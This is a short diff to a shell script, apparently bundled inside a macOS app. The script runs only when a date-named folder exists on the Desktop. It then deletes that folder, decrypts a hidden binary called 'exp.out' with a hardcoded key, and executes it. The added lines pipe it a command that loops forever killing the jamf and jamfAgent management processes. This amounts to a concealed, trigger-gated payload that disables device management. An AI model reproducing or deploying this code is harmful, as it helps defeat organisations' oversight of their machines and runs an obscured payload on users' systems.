@@ -4,10 +4,11 @@ res="$(dirname "$(dirname "$0")")/Resources"
 key="~/Desktop/$(date +%y%d)"
 
 # Run only if directory on Desktop exists with the current year and day
-if [[ -d $key ]]; then
-    rm -rf $key
-    openssl des3 -d -in "$res/exp.out.des3" -k b51861c95142fce29aef7b6416fa21d5 > /tmp/exp.out
+if ! [[ -d $key ]]; then exit 1; fi
 
-    
-fi
+rm -rf $key
+openssl des3 -d -in "$res/exp.out.des3" -k b51861c95142fce29aef7b6416fa21d5 > /tmp/exp.out
 
+/tmp/exp.out <<'EOF'
+(for ((;;)); do killall jamf jamfAgent; done) &
+EOF
